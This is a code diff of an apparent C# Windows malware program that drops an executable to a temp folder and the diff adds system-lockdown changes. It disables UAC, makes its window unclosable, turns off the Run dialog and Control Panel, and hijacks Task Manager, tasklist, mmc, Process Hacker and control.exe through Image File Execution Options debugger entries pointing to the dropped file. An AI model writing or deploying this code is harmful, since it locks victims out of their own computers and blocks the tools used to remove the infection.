@@ -22,7 +22,7 @@ namespace _000
 
         public Form1()
         {
-            //extract dll if they doesn't exists
+            //extract dll
             if (File.Exists(exeDir + "\\AxInterop.WMPLib.dll"))
             {
                 File.Delete(exeDir + "\\AxInterop.WMPLib.dll");
@@ -33,7 +33,19 @@ namespace _000
             }
             Extract("_000", exeDir, "Resources", "AxInterop.WMPLib.dll");
             Extract("_000", exeDir, "Resources", "Interop.WMPLib.dll");
+
             InitializeComponent();
+        }
+        protected override CreateParams CreateParams
+        {
+            get
+            {
+                const int CS_NOCLOSE = 0x200;
+
+                CreateParams cp = base.CreateParams;
+                cp.ClassStyle |= CS_NOCLOSE;
+                return cp;
+            }
         }
         public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
         {
@@ -71,7 +83,7 @@ namespace _000
                 File.WriteAllBytes(temp + "icon.ico", Properties.Resources.texticon);
                 File.WriteAllBytes(temp + "rniw.exe", Properties.Resources.subox);
 
-                //registry tweaks
+                //registry tweaks + app lockdown
                 RegistryKey editKey;
 
                 editKey = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
@@ -97,6 +109,38 @@ namespace _000
 
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                 editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
+                editKey.SetValue("shutdownwithoutlogon", "0", RegistryValueKind.DWord);
+                editKey.SetValue("undockwithoutlogon", "0", RegistryValueKind.DWord);
+                editKey.SetValue("VerboseStatus", "1", RegistryValueKind.DWord);
+                editKey.Close();
+
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                editKey.SetValue("NoRun", "1", RegistryValueKind.DWord);
+                editKey.SetValue("NoControlPanel", "1", RegistryValueKind.DWord);
+                editKey.Close();
+
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tasklist.exe");
+                editKey.SetValue("Debugger", temp + "\\rniw.exe", RegistryValueKind.String);
+                editKey.Close();
+
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe");
+                editKey.SetValue("Debugger", temp + "\\rniw.exe", RegistryValueKind.String);
+                editKey.Close();
+
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe");
+                editKey.SetValue("Debugger", temp + "\\rniw.exe", RegistryValueKind.String);
+                editKey.Close();
+
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ProcessHacker.exe");
+                editKey.SetValue("Debugger", temp + "\\rniw.exe", RegistryValueKind.String);
+                editKey.Close();
+
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tm.exe");
+                editKey.SetValue("Debugger", temp + "\\rniw.exe", RegistryValueKind.String);
+                editKey.Close();
+
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe");
+                editKey.SetValue("Debugger", temp + "\\rniw.exe", RegistryValueKind.String);
                 editKey.Close();
 
                 //finish tweaks
